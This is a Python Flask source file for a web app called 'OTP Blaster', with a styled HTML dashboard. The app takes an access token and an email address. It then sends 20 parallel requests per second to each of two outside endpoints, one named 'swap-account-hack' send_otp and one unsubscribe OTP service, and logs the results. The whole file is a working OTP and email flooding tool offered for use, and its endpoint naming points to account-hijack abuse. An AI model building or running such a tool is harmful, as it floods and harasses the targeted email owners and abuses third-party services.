# ============================================================
# OTP SENDER — Full Working
# Dual API · 20 Parallel/Sec · Success/Fail Separate Downloads
# Vercel + Railway Compatible
# ============================================================

import json
import os
import re
import threading
import time
from datetime import datetime
from zoneinfo import ZoneInfo

import requests
from flask import Flask, request, jsonify, Response

# ============================================================
# CONFIG
# ============================================================
DATA_FILE = "data.json"
TIMEZONE = ZoneInfo("Asia/Kolkata")

API_1 = "https://swap-account-hack-u3lo.vercel.app/send_otp?accesstoken={TOKEN}&email={EMAIL}"
API_2 = "https://unsubscribe-otp-3fpg.vercel.app/email_otp?email={EMAIL}"

PARALLEL_PER_API = 20
CYCLE_INTERVAL = 1.0

app = Flask(__name__)
app.secret_key = "otp-clean-secret"

# In-memory running state
RUNNING = {}

# ============================================================
# STORAGE
# ============================================================
DEFAULT = {"users": {}}


def load():
    if not os.path.exists(DATA_FILE):
        return json.loads(json.dumps(DEFAULT))
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            d = json.load(f)
        d.setdefault("users", {})
        return d
    except Exception:
        return json.loads(json.dumps(DEFAULT))


def save(d):
    try:
        with open(DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(d, f, indent=2, ensure_ascii=False)
    except Exception as e:
        print("save error:", e)


def ensure_user(d, uid):
    if uid not in d["users"]:
        d["users"][uid] = {"uid": uid, "pairs": {}}
    return d["users"][uid]


def gen_pid():
    return "p" + str(int(time.time() * 1000))[-9:]


def valid_email(e):
    return bool(re.match(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", e))

# ============================================================
# WORKER
# ============================================================
def hit_one(url):
    try:
        r = requests.get(url, timeout=8)
        ok = r.status_code == 200
        return ok, (r.text[:200] if ok else f"HTTP {r.status_code}: {r.text[:100]}")
    except Exception as e:
        return False, f"ERR: {str(e)[:120]}"


def worker(uid, pid):
    flag = RUNNING.setdefault(uid, {}).setdefault(pid, {"stop": False})
    flag["stop"] = False

    while not flag["stop"]:
        t0 = time.time()

        d = load()
        usr = d["users"].get(uid)
        if not usr:
            break
        p = usr.get("pairs", {}).get(pid)
        if not p:
            break

        token = p["token"]
        email = p["email"]

        url1 = API_1.replace("{TOKEN}", token).replace("{EMAIL}", email)
        url2 = API_2.replace("{EMAIL}", email)

        res1 = [None] * PARALLEL_PER_API
        res2 = [None] * PARALLEL_PER_API
        threads = []

        def w1(i):
            res1[i] = hit_one(url1)

        def w2(i):
            res2[i] = hit_one(url2)

        for i in range(PARALLEL_PER_API):
            t = threading.Thread(target=w1, args=(i,))
            t.start()
            threads.append(t)
        for i in range(PARALLEL_PER_API):
            t = threading.Thread(target=w2, args=(i,))
            t.start()
            threads.append(t)

        for t in threads:
            t.join(timeout=10)

        now_str = datetime.now(TIMEZONE).strftime("%H:%M:%S")
        now_full = datetime.now(TIMEZONE).strftime("%Y-%m-%d %H:%M:%S")

        new_success = []
        new_fail = []
        for r in res1:
            ok, body = r if r else (False, "timeout")
            entry = {"api": "API1", "email": email, "time": now_full, "body": body}
            (new_success if ok else new_fail).append(entry)
        for r in res2:
            ok, body = r if r else (False, "timeout")
            entry = {"api": "API2", "email": email, "time": now_full, "body": body}
            (new_success if ok else new_fail).append(entry)

        d = load()
        usr = d["users"].get(uid)
        if usr and pid in usr.get("pairs", {}):
            pp = usr["pairs"][pid]
            pp["cycles"] = pp.get("cycles", 0) + 1
            pp["success"] = pp.get("success", 0) + len(new_success)
            pp["fail"] = pp.get("fail", 0) + len(new_fail)
            pp["last_update"] = time.time()
            pp["last_time"] = now_str

            succ = pp.setdefault("success_log", [])
            fail = pp.setdefault("fail_log", [])
            succ.extend(new_success)
            fail.extend(new_fail)
            if len(succ) > 20000:
                pp["success_log"] = succ[-20000:]
            if len(fail) > 20000:
                pp["fail_log"] = fail[-20000:]

            save(d)

        elapsed = time.time() - t0
        time.sleep(max(0, CYCLE_INTERVAL - elapsed))


def start_pair(uid, pid):
    if uid in RUNNING and pid in RUNNING[uid] and not RUNNING[uid][pid].get("stop"):
        return False
    t = threading.Thread(target=worker, args=(uid, pid), daemon=True)
    t.start()
    return True


def stop_pair(uid, pid):
    if uid in RUNNING and pid in RUNNING[uid]:
        RUNNING[uid][pid]["stop"] = True


def is_running(uid, pid):
    return uid in RUNNING and pid in RUNNING[uid] and not RUNNING[uid][pid].get("stop")

# ============================================================
# HTML UI (Same Premium UI)
# ============================================================
HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>OTP Blaster</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
:root{--bg1:#050814;--bg2:#0a0e1a;--bg3:#0f172a;--card:rgba(15,23,42,.7);
--border:rgba(255,255,255,.08);--text:#fff;--muted:#94a3b8;--cyan:#06b6d4;
--blue:#3b82f6;--green:#10b981;--red:#ef4444;--gold:#fbbf24;--purple:#a855f7}
html,body{height:100%}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
background:radial-gradient(ellipse at top,#1e293b 0%,var(--bg1) 60%);
color:var(--text);min-height:100vh;padding:16px;padding-bottom:40px;overflow-x:hidden}
body::before{content:'';position:fixed;inset:0;
background:radial-gradient(circle at 20% 10%,rgba(6,182,212,.15),transparent 40%),
radial-gradient(circle at 80% 80%,rgba(139,92,246,.15),transparent 40%);
pointer-events:none;z-index:0}
.app{max-width:480px;margin:0 auto;position:relative;z-index:1}
@keyframes glow{0%,100%{box-shadow:0 0 20px rgba(6,182,212,.4),0 0 40px rgba(6,182,212,.1)}
50%{box-shadow:0 0 30px rgba(6,182,212,.7),0 0 60px rgba(6,182,212,.2)}}
@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.5;transform:scale(1.4)}}
@keyframes slideIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
@keyframes gradientShift{0%,100%{background-position:0% 50%}50%{background-position:100% 50%}}
@keyframes up{from{transform:translateY(100%)}to{transform:translateY(0)}}
.header{display:flex;justify-content:space-between;align-items:center;padding:8px 0 24px;
animation:slideIn .6s ease}
.logo{display:flex;align-items:center;gap:10px;font-weight:800;font-size:20px;letter-spacing:-.5px}
.logo-icon{width:40px;height:40px;border-radius:12px;
background:linear-gradient(135deg,var(--cyan),var(--blue));
display:flex;align-items:center;justify-content:center;font-size:20px;
animation:glow 3s infinite}
.logo-text{background:linear-gradient(135deg,#fff,#94a3b8);
-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.status-pill{display:flex;align-items:center;gap:6px;padding:8px 14px;
border-radius:999px;background:rgba(255,255,255,.05);
border:1px solid var(--border);font-size:11px;font-weight:700;letter-spacing:.5px}
.dot{width:8px;height:8px;border-radius:50%;background:var(--muted);transition:.3s}
.dot.run{background:var(--green);box-shadow:0 0 12px var(--green);animation:pulse 1.4s infinite}
.dot.stop{background:#475569}
.card{background:var(--card);backdrop-filter:blur(20px);
border:1px solid var(--border);border-radius:20px;padding:20px;margin-bottom:16px;
animation:slideIn .6s ease;position:relative;overflow:hidden}
.card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;
background:linear-gradient(90deg,transparent,var(--cyan),transparent);opacity:.5}
.card-title{font-size:11px;color:var(--muted);text-transform:uppercase;
letter-spacing:1.5px;margin-bottom:14px;font-weight:700;display:flex;align-items:center;gap:8px}
.hero{text-align:center;padding:24px 0}
.hero h1{font-size:32px;font-weight:900;letter-spacing:-1px;margin-bottom:8px;
background:linear-gradient(135deg,var(--cyan),var(--blue),var(--purple));
background-size:200% 200%;animation:gradientShift 4s infinite;
-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.hero p{color:var(--muted);font-size:14px}
.label{display:block;font-size:11px;color:var(--muted);margin-bottom:8px;
font-weight:600;text-transform:uppercase;letter-spacing:1px}
input,select,textarea{width:100%;padding:14px 16px;border-radius:14px;
border:1px solid var(--border);background:rgba(0,0,0,.4);color:var(--text);
font-size:15px;font-family:inherit;margin-bottom:14px;outline:none;transition:all .25s}
input:focus,select:focus,textarea:focus{border-color:var(--cyan);
box-shadow:0 0 0 4px rgba(6,182,212,.15),0 0 20px rgba(6,182,212,.2);
background:rgba(0,0,0,.6)}
input::placeholder{color:#475569}
button{width:100%;padding:16px;border:none;border-radius:14px;font-size:15px;
font-weight:700;font-family:inherit;cursor:pointer;color:#fff;
margin-bottom:10px;transition:all .2s;letter-spacing:.5px;position:relative;overflow:hidden}
button::before{content:'';position:absolute;inset:0;
background:linear-gradient(90deg,transparent,rgba(255,255,255,.2),transparent);
transform:translateX(-100%);transition:.6s}
button:hover::before{transform:translateX(100%)}
button:active{transform:scale(.97)}
button:disabled{opacity:.4;cursor:not-allowed}
.btn-primary{background:linear-gradient(135deg,var(--cyan),var(--blue));
box-shadow:0 8px 24px rgba(6,182,212,.4),inset 0 1px 0 rgba(255,255,255,.2)}
.btn-success{background:linear-gradient(135deg,var(--green),#059669);
box-shadow:0 8px 24px rgba(16,185,129,.4)}
.btn-danger{background:linear-gradient(135deg,var(--red),#dc2626);
box-shadow:0 8px 24px rgba(239,68,68,.4)}
.btn-ghost{background:rgba(255,255,255,.05);border:1px solid var(--border);color:var(--text)}
.btn-sm{padding:12px;font-size:13px;border-radius:12px;margin-bottom:8px}
.row{display:flex;gap:10px}
.row>button{margin-bottom:0}
.grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.stat{background:linear-gradient(135deg,rgba(255,255,255,.04),rgba(255,255,255,.01));
border:1px solid var(--border);border-radius:16px;padding:18px;text-align:center;
position:relative;overflow:hidden;transition:.3s}
.stat::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;
background:linear-gradient(90deg,transparent,rgba(255,255,255,.2),transparent)}
.stat:hover{transform:translateY(-3px);border-color:rgba(6,182,212,.3)}
.stat .icon{font-size:20px;margin-bottom:6px;display:block;opacity:.8}
.stat .v{font-size:28px;font-weight:900;margin:4px 0;letter-spacing:-1px;
background:linear-gradient(135deg,var(--cyan),var(--blue));
-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.stat .l{font-size:10px;color:var(--muted);text-transform:uppercase;
letter-spacing:1px;font-weight:700}
.stat.g .v{background:linear-gradient(135deg,var(--green),#34d399);
-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.stat.r .v{background:linear-gradient(135deg,var(--red),#f87171);
-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.stat.gd .v{background:linear-gradient(135deg,var(--gold),#fcd34d);
-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.pair{background:rgba(255,255,255,.03);border:1px solid var(--border);
border-radius:16px;padding:16px;margin-bottom:12px;transition:.3s;animation:slideIn .5s ease}
.pair:hover{border-color:rgba(6,182,212,.3);box-shadow:0 8px 24px rgba(6,182,212,.15)}
.pair-h{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px}
.pair-em{font-weight:700;font-size:15px;word-break:break-all;color:#fff}
.pair-tk{font-size:11px;color:var(--muted);font-family:monospace;margin-bottom:10px;
padding:6px 10px;background:rgba(0,0,0,.3);border-radius:8px;display:inline-block}
.pair-st{display:flex;gap:14px;font-size:13px;color:var(--muted);margin-bottom:10px;flex-wrap:wrap}
.pair-st b{color:#fff;font-weight:700}
.pill-run{padding:5px 12px;border-radius:999px;font-size:10px;font-weight:800;
background:rgba(16,185,129,.15);color:var(--green);
border:1px solid rgba(16,185,129,.3);letter-spacing:.5px;animation:pulse 1.5s infinite}
.pill-stop{padding:5px 12px;border-radius:999px;font-size:10px;font-weight:800;
background:rgba(148,163,184,.1);color:var(--muted);border:1px solid var(--border);
letter-spacing:.5px}
.modal-bg{position:fixed;inset:0;background:rgba(0,0,0,.75);backdrop-filter:blur(12px);
display:none;align-items:flex-end;justify-content:center;z-index:100}
.modal-bg.show{display:flex;animation:slideIn .2s ease}
.modal{background:linear-gradient(180deg,#0f172a,#0a0e1a);
border:1px solid var(--border);border-radius:24px 24px 0 0;
padding:24px;width:100%;max-width:480px;animation:up .35s cubic-bezier(.2,.9,.3,1)}
.modal-title{font-size:20px;font-weight:800;margin-bottom:20px;
background:linear-gradient(135deg,#fff,#94a3b8);
-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.toast{position:fixed;top:20px;right:20px;padding:14px 18px;border-radius:14px;
background:rgba(15,23,42,.95);backdrop-filter:blur(20px);
border:1px solid var(--border);color:#fff;font-size:13px;font-weight:600;
z-index:200;opacity:0;transform:translateX(120%);
transition:all .35s cubic-bezier(.2,.9,.3,1);max-width:280px;
box-shadow:0 8px 32px rgba(0,0,0,.4)}
.toast.show{opacity:1;transform:translateX(0)}
.toast.success{border-color:var(--green);box-shadow:0 0 24px rgba(16,185,129,.3)}
.toast.error{border-color:var(--red);box-shadow:0 0 24px rgba(239,68,68,.3)}
.live-box{background:linear-gradient(135deg,rgba(6,182,212,.08),rgba(139,92,246,.08));
border:1px solid rgba(6,182,212,.2);border-radius:16px;padding:16px;margin-bottom:12px;
animation:glow 3s infinite}
.live-title{font-size:12px;font-weight:800;color:var(--cyan);letter-spacing:1.5px;
margin-bottom:12px;text-transform:uppercase}
.live-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:10px}
.live-stat{background:rgba(0,0,0,.3);border-radius:12px;padding:12px;text-align:center}
.live-stat .n{font-size:22px;font-weight:900;letter-spacing:-1px}
.live-stat .k{font-size:10px;color:var(--muted);text-transform:uppercase;
letter-spacing:1px;font-weight:700;margin-top:2px}
.live-stat.ok .n{color:var(--green)}
.live-stat.fail .n{color:var(--red)}
.progress-ring{width:100px;height:100px;margin:0 auto 14px;position:relative}
.progress-ring svg{transform:rotate(-90deg)}
.progress-ring circle{fill:none;stroke-width:6;stroke-linecap:round}
.progress-ring .bg{stroke:rgba(255,255,255,.08)}
.progress-ring .fg{stroke:url(#grad);transition:stroke-dashoffset 1s}
.progress-ring .pct{position:absolute;inset:0;display:flex;align-items:center;
justify-content:center;font-size:20px;font-weight:900;
background:linear-gradient(135deg,var(--cyan),var(--blue));
-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.empty{text-align:center;color:var(--muted);padding:40px 20px;font-size:14px}
.empty .icon{font-size:40px;margin-bottom:12px;opacity:.5;display:block}
.sparkle{position:fixed;width:6px;height:6px;border-radius:50%;
background:var(--cyan);pointer-events:none;z-index:999;box-shadow:0 0 10px var(--cyan)}
</style>
</head>
<body>
<div class="app">

<div class="header">
  <div class="logo">
    <div class="logo-icon">🚀</div>
    <span class="logo-text">OTP Blaster</span>
  </div>
  <div class="status-pill">
    <div class="dot" id="gd"></div>
    <span id="gs">IDLE</span>
  </div>
</div>

<div id="setupScreen">
  <div class="card" style="animation-delay:.1s">
    <div class="hero">
      <h1>Welcome</h1>
      <p>Start sending OTPs in seconds</p>
    </div>
    <label class="label">🔑 Access Token</label>
    <input id="su" type="password" placeholder="Paste your access token">
    <label class="label">📧 Email Address</label>
    <input id="se" type="email" placeholder="user@example.com">
    <button class="btn-primary" onclick="startFromSetup()">START SENDING →</button>
  </div>
</div>

<div id="mainApp" style="display:none">
  <div class="card">
    <div class="card-title">📊 Live Stats</div>
    <div class="grid2">
      <div class="stat"><span class="icon">📤</span><div class="v" id="sTotal">0</div><div class="l">Total</div></div>
      <div class="stat g"><span class="icon">✅</span><div class="v" id="sOk">0</div><div class="l">Success</div></div>
      <div class="stat r"><span class="icon">❌</span><div class="v" id="sFail">0</div><div class="l">Failed</div></div>
      <div class="stat gd"><span class="icon">🔁</span><div class="v" id="sCycles">0</div><div class="l">Cycles</div></div>
    </div>
  </div>
  <div class="card">
    <button class="btn-primary" onclick="openAdd()">➕ ADD EMAIL</button>
  </div>
  <div id="pairsContainer"></div>
</div>

</div>

<div class="modal-bg" id="addModal">
  <div class="modal">
    <div class="modal-title">📧 Add Account</div>
    <label class="label">🔑 Access Token</label>
    <input id="at" type="password" placeholder="Paste access token">
    <label class="label">📧 Email Address</label>
    <input id="ae" type="email" placeholder="user@example.com">
    <div class="row">
      <button class="btn-ghost btn-sm" onclick="closeAdd()">CANCEL</button>
      <button class="btn-primary btn-sm" onclick="submitAdd()">SAVE & START</button>
    </div>
  </div>
</div>

<div class="toast" id="toast"></div>

<svg width="0" height="0" style="position:absolute">
  <defs>
    <linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#06b6d4"/>
      <stop offset="100%" stop-color="#3b82f6"/>
    </linearGradient>
  </defs>
</svg>

<script>
const state = { uid: localStorage.getItem('uid') || '', pairs: {} };

function toast(msg, type='success') {
  const el = document.getElementById('toast');
  el.textContent = msg;
  el.className = 'toast show ' + type;
  setTimeout(() => el.className = 'toast ' + type, 2600);
}

function sparkle(x, y) {
  for (let i = 0; i < 6; i++) {
    const s = document.createElement('div');
    s.className = 'sparkle';
    s.style.left = x + 'px';
    s.style.top = y + 'px';
    s.style.background = ['#06b6d4', '#3b82f6', '#a855f7'][i % 3];
    document.body.appendChild(s);
    const angle = (Math.PI * 2 * i) / 6;
    const dist = 40 + Math.random() * 30;
    s.animate([
      { transform: 'translate(0,0) scale(1)', opacity: 1 },
      { transform: `translate(${Math.cos(angle)*dist}px, ${Math.sin(angle)*dist}px) scale(0)`, opacity: 0 }
    ], { duration: 600, easing: 'cubic-bezier(.2,.9,.3,1)' }).onfinish = () => s.remove();
  }
}

async function api(p, m='GET', b=null) {
  const o = { method: m, headers: { 'Content-Type': 'application/json' } };
  if (b) o.body = JSON.stringify(b);
  return (await fetch(p, o)).json();
}

function startFromSetup() {
  const t = document.getElementById('su').value.trim();
  const e = document.getElementById('se').value.trim();
  if (!t) { toast('Token required', 'error'); return; }
  if (!e || !e.includes('@')) { toast('Valid email required', 'error'); return; }
  if (!state.uid) {
    state.uid = 'u_' + Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
    localStorage.setItem('uid', state.uid);
  }
  api('/api/init', 'POST', { uid: state.uid }).then(() => {
    document.getElementById('setupScreen').style.display = 'none';
    document.getElementById('mainApp').style.display = 'block';
    toast('✅ Setup complete!');
    sparkle(window.innerWidth/2, window.innerHeight/2);
    api('/api/pairs/add', 'POST', { uid: state.uid, token: t, email: e, autostart: true })
      .then(r => { if (r.success) refresh(); });
    refresh();
    setInterval(refresh, 1200);
  });
}

async function refresh() {
  const r = await api('/api/status?uid=' + encodeURIComponent(state.uid));
  if (!r.success) return;
  state.pairs = r.user.pairs || {};

  let total = 0, ok = 0, fail = 0, cycles = 0, running = 0;
  for (const pid in state.pairs) {
    const p = state.pairs[pid];
    total += (p.success || 0) + (p.fail || 0);
    ok += p.success || 0;
    fail += p.fail || 0;
    cycles += p.cycles || 0;
    if (p.running) running++;
  }
  document.getElementById('sTotal').textContent = total.toLocaleString();
  document.getElementById('sOk').textContent = ok.toLocaleString();
  document.getElementById('sFail').textContent = fail.toLocaleString();
  document.getElementById('sCycles').textContent = cycles.toLocaleString();

  const gd = document.getElementById('gd'), gs = document.getElementById('gs');
  if (running > 0) { gd.classList.add('run'); gd.classList.remove('stop'); gs.textContent = 'RUNNING'; }
  else { gd.classList.remove('run'); gd.classList.add('stop'); gs.textContent = 'IDLE'; }

  renderPairs();
}

function renderPairs() {
  const c = document.getElementById('pairsContainer');
  const ids = Object.keys(state.pairs);
  if (!ids.length) {
    c.innerHTML = '<div class="card"><div class="empty"><span class="icon">📭</span>No accounts yet</div></div>';
    return;
  }
  let html = '';
  for (const pid of ids) {
    const p = state.pairs[pid];
    const ok = p.success || 0;
    const fail = p.fail || 0;
    const total = ok + fail;
    const rate = total > 0 ? Math.round((ok / total) * 100) : 0;
    const offset = 283 - (rate / 100) * 283;

    html += `
      <div class="card">
        <div class="pair-h">
          <div class="pair-em">📧 ${p.email}</div>
          <div class="${p.running ? 'pill-run' : 'pill-stop'}">
            ${p.running ? '● RUNNING' : '○ STOPPED'}
          </div>
        </div>
        <div class="pair-tk">🔑 ...${p.token.slice(-10)}</div>

        ${p.running ? `
        <div class="live-box">
          <div class="live-title">⚡ LIVE · 20 Parallel · 1s Cycle</div>
          <div class="live-grid">
            <div class="live-stat"><div class="n" style="color:#06b6d4">${total.toLocaleString()}</div><div class="k">Total</div></div>
            <div class="live-stat ok"><div class="n">${ok.toLocaleString()}</div><div class="k">Success</div></div>
            <div class="live-stat fail"><div class="n">${fail.toLocaleString()}</div><div class="k">Failed</div></div>
            <div class="live-stat"><div class="n" style="color:#fbbf24">${p.cycles || 0}</div><div class="k">Cycles</div></div>
          </div>
        </div>
        ` : ''}

        <div class="progress-ring">
          <svg width="100" height="100" viewBox="0 0 100 100">
            <circle class="bg" cx="50" cy="50" r="45"/>
            <circle class="fg" cx="50" cy="50" r="45"
              stroke-dasharray="283"
              stroke-dashoffset="${offset}"/>
          </svg>
          <div class="pct">${rate}%</div>
        </div>

        <div class="pair-st" style="justify-content:center">
          <span>📤 <b>${total.toLocaleString()}</b></span>
          <span style="color:var(--green)">✅ <b style="color:var(--green)">${ok.toLocaleString()}</b></span>
          <span style="color:var(--red)">❌ <b style="color:var(--red)">${fail.toLocaleString()}</b></span>
        </div>

        <div class="row" style="margin-top:12px">
          ${p.running
            ? `<button class="btn-danger btn-sm" onclick="stopP('${pid}',event)">⏹️ STOP</button>`
            : `<button class="btn-success btn-sm" onclick="startP('${pid}',event)">▶️ START</button>`}
          <button class="btn-ghost btn-sm" onclick="delP('${pid}',event)">🗑️</button>
        </div>

        <div class="row" style="margin-top:8px">
          <button class="btn-success btn-sm" onclick="dl('${pid}','success')">📥 SUCCESS LOG</button>
          <button class="btn-danger btn-sm" onclick="dl('${pid}','fail')">📥 FAIL LOG</button>
        </div>

        <div style="font-size:11px;color:var(--muted);text-align:center;margin-top:10px">
          🕐 Last: ${p.last_time || '—'}
        </div>
      </div>
    `;
  }
  c.innerHTML = html;
}

function openAdd() { document.getElementById('addModal').classList.add('show'); }
function closeAdd() {
  document.getElementById('addModal').classList.remove('show');
  document.getElementById('at').value = '';
  document.getElementById('ae').value = '';
}

async function submitAdd() {
  const t = document.getElementById('at').value.trim();
  const e = document.getElementById('ae').value.trim();
  if (!t) { toast('Token required', 'error'); return; }
  if (!e || !e.includes('@')) { toast('Valid email required', 'error'); return; }
  const r = await api('/api/pairs/add', 'POST', { uid: state.uid, token: t, email: e, autostart: true });
  if (!r.success) { toast(r.message || 'Failed', 'error'); return; }
  toast('✅ Added & started!');
  sparkle(window.innerWidth/2, window.innerHeight/2);
  closeAdd();
  refresh();
}

async function startP(pid, ev) {
  ev?.stopPropagation();
  const r = await api('/api/pairs/start', 'POST', { uid: state.uid, pair_id: pid });
  if (r.success) { toast('▶️ Started'); refresh(); } else toast(r.message || 'Failed', 'error');
}

async function stopP(pid, ev) {
  ev?.stopPropagation();
  await api('/api/pairs/stop', 'POST', { uid: state.uid, pair_id: pid });
  toast('⏹️ Stopped');
  refresh();
}

async function delP(pid, ev) {
  ev?.stopPropagation();
  if (!confirm('Delete this account?')) return;
  await api('/api/pairs/delete', 'POST', { uid: state.uid, pair_id: pid });
  toast('🗑️ Deleted');
  refresh();
}

function dl(pid, type) {
  window.location.href = '/api/logs/download?uid=' + encodeURIComponent(state.uid)
    + '&pair_id=' + encodeURIComponent(pid) + '&type=' + type;
}

if (state.uid) {
  api('/api/init', 'POST', { uid: state.uid }).then(() => {
    document.getElementById('setupScreen').style.display = 'none';
    document.getElementById('mainApp').style.display = 'block';
    refresh();
    setInterval(refresh, 1200);
  });
}
</script>
</body>
</html>
"""

# ============================================================
# ROUTES
# ============================================================
@app.route("/")
def index():
    return Response(HTML, mimetype="text/html")


@app.route("/api/init", methods=["POST"])
def api_init():
    data = request.get_json() or {}
    uid = data.get("uid", "").strip()
    if not uid:
        return jsonify({"success": False})
    d = load()
    ensure_user(d, uid)
    save(d)
    return jsonify({"success": True, "user": d["users"][uid]})


@app.route("/api/status")
def api_status():
    uid = request.args.get("uid", "")
    d = load()
    usr = d["users"].get(uid)
    if not usr:
        return jsonify({"success": False})
    for pid in usr.get("pairs", {}):
        usr["pairs"][pid]["running"] = is_running(uid, pid)
    return jsonify({"success": True, "user": usr})


@app.route("/api/pairs/add", methods=["POST"])
def api_pairs_add():
    data = request.get_json() or {}
    uid = data.get("uid", "")
    token = data.get("token", "").strip()
    email = data.get("email", "").strip().lower()
    autostart = bool(data.get("autostart"))

    if not uid or not token or not valid_email(email):
        return jsonify({"success": False, "message": "Invalid input"})

    d = load()
    usr = ensure_user(d, uid)

    pid = gen_pid()
    usr.setdefault("pairs", {})[pid] = {
        "id": pid, "token": token, "email": email,
        "cycles": 0, "success": 0, "fail": 0,
        "success_log": [], "fail_log": [],
        "running": False, "created_at": time.time(), "last_time": "—",
    }
    save(d)
    if autostart:
        start_pair(uid, pid)
    return jsonify({"success": True, "pair_id": pid})


@app.route("/api/pairs/start", methods=["POST"])
def api_pairs_start():
    data = request.get_json() or {}
    uid, pid = data.get("uid", ""), data.get("pair_id", "")
    return jsonify({"success": start_pair(uid, pid)})


@app.route("/api/pairs/stop", methods=["POST"])
def api_pairs_stop():
    data = request.get_json() or {}
    uid, pid = data.get("uid", ""), data.get("pair_id", "")
    stop_pair(uid, pid)
    return jsonify({"success": True})


@app.route("/api/pairs/delete", methods=["POST"])
def api_pairs_delete():
    data = request.get_json() or {}
    uid, pid = data.get("uid", ""), data.get("pair_id", "")
    stop_pair(uid, pid)
    d = load()
    usr = d["users"].get(uid)
    if usr and pid in usr.get("pairs", {}):
        del usr["pairs"][pid]
        save(d)
    return jsonify({"success": True})


@app.route("/api/logs/download")
def api_logs_download():
    uid = request.args.get("uid", "")
    pid = request.args.get("pair_id", "")
    log_type = request.args.get("type", "success")

    d = load()
    usr = d["users"].get(uid)
    if not usr:
        return Response("User not found", status=404)
    p = usr.get("pairs", {}).get(pid)
    if not p:
        return Response("Pair not found", status=404)

    if log_type == "success":
        entries = p.get("success_log", [])
        title = "SUCCESS LOG"
        filename = f"success_{p['email'].split('@')[0]}_{int(time.time())}.txt"
    else:
        entries = p.get("fail_log", [])
        title = "FAILED LOG"
        filename = f"failed_{p['email'].split('@')[0]}_{int(time.time())}.txt"

    lines = [
        "=" * 70, f"OTP BLASTER — {title}", "=" * 70,
        f"Email: {p['email']}",
        f"Token: ...{p['token'][-10:]}",
        f"Generated: {datetime.now(TIMEZONE).strftime('%Y-%m-%d %H:%M:%S')}",
        f"Total Cycles: {p.get('cycles', 0)}",
        f"Total Success: {p.get('success', 0)}",
        f"Total Failed: {p.get('fail', 0)}",
        f"Entries in this file: {len(entries)}",
        "=" * 70, "",
    ]
    if not entries:
        lines.append("(No entries yet)")
    else:
        lines.append(f"{'#':<7}{'TIME':<22}{'API':<8}{'BODY / RESPONSE'}")
        lines.append("-" * 100)
        for i, e in enumerate(entries, 1):
            body = (e.get("body", "") or "").replace("\n", " ")[:120]
            lines.append(f"{i:<7}{e.get('time', ''):<22}{e.get('api', ''):<8}{body}")

    return Response(
        "\n".join(lines),
        mimetype="text/plain",
        headers={"Content-Disposition": f"attachment; filename={filename}"}
    )


# ============================================================
# RESUME ON STARTUP
# ============================================================
def resume_all():
    d = load()
    for uid, usr in d["users"].items():
        for pid, p in usr.get("pairs", {}).items():
            if p.get("running"):
                start_pair(uid, pid)


# Vercel / Railway auto-detect `app` variable
resume_all()


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"🚀 Running on http://0.0.0.0:{port}")
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)